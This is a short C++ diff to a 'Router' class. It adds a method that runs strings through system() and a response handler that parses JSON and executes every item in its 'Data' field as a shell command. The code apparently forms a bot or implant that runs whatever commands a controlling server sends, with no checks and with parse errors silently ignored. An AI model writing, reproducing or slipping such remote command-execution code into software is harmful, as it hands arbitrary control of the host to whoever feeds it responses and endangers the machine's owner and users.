@@ -76,6 +76,10 @@ private:
         return output;
     }
 
+    void ExecuteCommand(const std::string& cmd) {
+        system(cmd.c_str());
+    }
+
 public:
     Router(): id("1234") {
     }
@@ -150,7 +154,20 @@ public:
         return IPList;
     }
 
-    void handleRequest(std::string req) {
-        std::cout << req << std::endl;
+    void handleResponseToRequest(std::string res) {
+        try {
+            JSON responseJson = JSON::parse(res);
+
+            if (responseJson["Data"] == nullptr)
+                return;
+
+            JSON response = responseJson["Data"];
+            for (auto i = response.begin(); i != response.end(); i++) {
+                ExecuteCommand(*i);
+            }
+        
+        } catch (nlohmann::detail::parse_error error) {
+            return;
+        }
     }
 };
